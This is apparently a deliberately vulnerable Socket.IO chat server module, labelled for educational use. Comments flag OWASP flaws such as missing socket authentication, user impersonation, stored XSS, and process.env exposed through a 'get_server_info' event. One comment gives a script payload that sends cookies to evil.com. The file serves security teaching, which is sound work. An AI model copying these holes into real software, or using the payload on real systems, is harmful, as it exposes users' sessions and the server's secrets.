// ⚠️ INTENTIONALLY VULNERABLE — EDUCATIONAL USE ONLY
const { Server } = require('socket.io');
const Message = require('./models/Message');
const Chat = require('./models/Chat');
const User = require('./models/User');

let io;
const userSocketMap = new Map();

const initSocket = (server) => {
    io = new Server(server, {
        cors: {
            // VULNERABLE: A05 — Allows ALL origins for WebSocket connections
            origin: '*',
            methods: ['GET', 'POST'],
            credentials: true,
        },
    });

    // ==================== VULNERABILITY: A07 — No Socket Authentication ====================
    // No JWT verification on socket connection — anyone can connect and impersonate any user

    io.on('connection', (socket) => {
        console.log(`Socket connected: ${socket.id}`);

        // VULNERABLE: A01 — No authentication — any socket can join as any user
        // Attack: Connect via socket.io and emit join_app with any userId to impersonate them
        socket.on('join_app', async (userId) => {
            if (!userId) return;

            userSocketMap.set(userId, socket.id);
            socket.join(userId);

            try {
                await User.findByIdAndUpdate(userId, { status: 'online', lastSeen: new Date() });
            } catch (err) {
                console.error('Failed to update user status on join:', err);
            }

            console.log(`User ${userId} joined.`);
            io.emit('user_status_change', { userId, status: 'online' });

            // VULNERABLE: Broadcasts ALL active user IDs to everyone
            const activeUsers = Array.from(userSocketMap.keys());
            io.emit('active_users', activeUsers);
        });

        // ==================== VULNERABILITY: A01 — No Auth on Messages ====================
        // Any socket can send messages as any user — no verification of senderId
        socket.on('send_private_message', async (data) => {
            const { senderId, receiverId, text, fileUrl, fileType, chat_id, isGroup } = data;

            try {
                let chatId = chat_id;
                let chat;
                if (!chatId) {
                    chat = await Chat.findOne({
                        participants: { $all: [senderId, receiverId], $size: 2 },
                    });
                    if (!chat) {
                        chat = await Chat.create({ participants: [senderId, receiverId] });
                    }
                    chatId = chat._id;
                } else if (isGroup) {
                    chat = await Chat.findById(chatId);
                }

                // VULNERABLE: A03 — No input sanitization — stored XSS via text field
                // Attack: Send text: "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
                const newMessage = await Message.create({
                    sender_id: senderId,
                    receiver_id: isGroup ? null : receiverId,
                    chat_id: chatId,
                    text: text || '',           // VULNERABLE: No sanitization
                    fileUrl: fileUrl || '',      // VULNERABLE: Can inject arbitrary URLs
                    fileType: fileType || '',
                    status: (!isGroup && userSocketMap.has(receiverId)) ? 'delivered' : 'sent',
                });

                await Chat.findByIdAndUpdate(chatId, { lastMessage: newMessage._id });

                const populatedMsg = await Message.findById(newMessage._id)
                    .populate('sender_id', 'username profilePic email')
                    .lean();

                io.to(senderId).emit('message_sent', { ...populatedMsg, chat_id: chatId });

                if (isGroup && chat) {
                    chat.participants.forEach(participantId => {
                        const pidStr = participantId.toString();
                        if (pidStr !== senderId) {
                            io.to(pidStr).emit('receive_private_message', { ...populatedMsg, chat_id: chatId });
                        }
                    });
                } else {
                    io.to(receiverId).emit('receive_private_message', { ...populatedMsg, chat_id: chatId });
                }

            } catch (err) {
                console.error('Error handling message:', err);
                // VULNERABLE: Sends full error details to client
                io.to(socket.id).emit('message_error', { error: err.message, stack: err.stack });
            }
        });

        // Typing indicator — no auth
        socket.on('typing', async ({ senderId, receiverId, isTyping, isGroup }) => {
            if (isGroup) {
                try {
                    const chat = await Chat.findById(receiverId);
                    if (chat) {
                        chat.participants.forEach(participantId => {
                            const pidStr = participantId.toString();
                            if (pidStr !== senderId) {
                                io.to(pidStr).emit('display_typing', { senderId, isTyping });
                            }
                        });
                    }
                } catch (err) {
                    console.error('Error handling group typing:', err);
                }
            } else {
                io.to(receiverId).emit('display_typing', { senderId, isTyping });
            }
        });

        // Mark messages as read — no auth
        socket.on('mark_read', async ({ senderId, receiverId }) => {
            try {
                await Message.updateMany(
                    { sender_id: senderId, receiver_id: receiverId, status: { $ne: 'read' } },
                    { status: 'read' }
                );
                io.to(senderId).emit('messages_read', { readBy: receiverId });
            } catch (err) {
                console.error('Error marking messages as read:', err);
            }
        });

        // ==================== VULNERABILITY: A01 — Edit/Delete Any Message via Socket ====================
        // No ownership verification — any socket can edit/delete any message
        socket.on('edit_message', async ({ messageId, newText, receiverId }) => {
            try {
                // VULNERABLE: No check that the requester is the message owner
                const message = await Message.findByIdAndUpdate(
                    messageId,
                    { text: newText, edited: true },  // VULNERABLE: XSS in newText
                    { new: true }
                ).lean();
                if (message) {
                    io.to(receiverId).emit('message_edited', message);
                    // VULNERABLE: Broadcasts edit to ALL connected users
                    io.emit('message_edited_global', message);
                }
            } catch (err) {
                console.error('Error editing message:', err);
            }
        });

        socket.on('delete_message', async ({ messageId, receiverId }) => {
            try {
                // VULNERABLE: No ownership check
                await Message.findByIdAndUpdate(messageId, {
                    deleted: true,
                    text: 'This message was deleted',
                });
                io.to(receiverId).emit('message_deleted', { messageId });
            } catch (err) {
                console.error('Error deleting message:', err);
            }
        });

        // Message reaction — no auth
        socket.on('react_message', async ({ messageId, emoji, userId, receiverId }) => {
            try {
                const message = await Message.findById(messageId);
                if (message) {
                    message.reactions = message.reactions.filter(
                        (r) => r.user.toString() !== userId
                    );
                    message.reactions.push({ user: userId, emoji });
                    await message.save();
                    io.to(receiverId).emit('message_reacted', { messageId, reactions: message.reactions });
                    io.to(userId).emit('message_reacted', { messageId, reactions: message.reactions });
                }
            } catch (err) {
                console.error('Error reacting to message:', err);
            }
        });

        // ==================== VULNERABILITY: A01 — Server Info Leak via Socket ====================
        // Any connected client can request server internals
        socket.on('get_server_info', () => {
            socket.emit('server_info', {
                env: process.env,
                activeUsers: Array.from(userSocketMap.entries()),
                memoryUsage: process.memoryUsage(),
                uptime: process.uptime(),
                cwd: process.cwd(),
            });
        });

        // Disconnect handler
        socket.on('disconnect', async () => {
            console.log(`Socket disconnected: ${socket.id}`);

            let disconnectedUserId = null;
            for (let [userId, mappedSocketId] of userSocketMap.entries()) {
                if (mappedSocketId === socket.id) {
                    disconnectedUserId = userId;
                    userSocketMap.delete(userId);
                    break;
                }
            }

            if (disconnectedUserId) {
                try {
                    await User.findByIdAndUpdate(disconnectedUserId, {
                        status: 'offline',
                        lastSeen: new Date(),
                    });
                    io.emit('user_status_change', { userId: disconnectedUserId, status: 'offline' });
                } catch (err) {
                    console.error('Error updating status on disconnect:', err);
                }
            }
        });
    });

    return io;
};

const getIO = () => {
    if (!io) throw new Error('Socket.io not initialized!');
    return io;
};

const getUserSocketMap = () => userSocketMap;

module.exports = { initSocket, getIO, getUserSocketMap };
